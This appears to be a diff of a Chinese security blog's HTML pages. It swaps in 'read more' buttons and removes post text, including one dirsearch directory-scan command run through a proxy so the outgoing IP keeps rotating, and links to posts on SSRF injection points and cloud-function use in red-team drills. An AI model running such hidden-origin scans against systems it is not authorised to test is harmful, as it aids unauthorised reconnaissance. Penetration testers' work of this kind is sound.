-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u http://xxxxxxx.com --proxy=http://localhost:8888</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208021522846.png" alt="image-20220802152238700"></p>
-<p><strong>效果如下：</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202208021531279.png" alt="image-20220802153139164"></p>
-<p>出口一直在变化</p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/08/05/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B9%8B%E4%BA%91%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -766,6 +835,14 @@
 <p>这里将各个场景补充一下，方便日后测试。</p>
 <h2 id="1、文章转发点"><a href="#1、文章转发点" class="headerlink" title="1、文章转发点"></a>1、文章转发点</h2><p>转发–&gt;获取url参数数值–&gt;请求该地址–&gt;获取返回信息</p>
 
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/04/27/SSRF%E6%BC%8F%E6%B4%9E%E7%82%B9%E4%BD%8D%E6%B1%87%E6%80%BB%E2%80%94%E2%80%94%E9%95%BF%E6%9C%9F%E8%A1%A5%E5%85%85/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1042,87 +1119,6 @@
             </div>
           <!--/noindex-->
         
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://liaorj.github.io/2022/04/24/SRC%E5%A7%BF%E5%8A%BF(%E5%9B%9B)/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/touxiang.jpg">
-      <meta itemprop="name" content="LiAoRJ">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="LiAoRJ的成长记录">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | LiAoRJ的成长记录">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/04/24/SRC%E5%A7%BF%E5%8A%BF(%E5%9B%9B)/" class="post-title-link" itemprop="url">SRC姿势(四)</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2022-04-24 23:08:14 / 修改时间：23:12:22" itemprop="dateCreated datePublished" datetime="2022-04-24T23:08:14+08:00">2022-04-24</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/SRC%E5%A7%BF%E5%8A%BF/" itemprop="url" rel="index"><span itemprop="name">SRC姿势</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="SRC姿势-四"><a href="#SRC姿势-四" class="headerlink" title="SRC姿势(四)"></a>SRC姿势(四)</h1><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204242311961.png" alt="image-20220424231133899"></p>
-<p>GitHub地址：</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/LiAoRJ/src">LiAoRJ&#x2F;src: SRC姿势收集 (github.com)</a></p>
-
       
     </div>
 
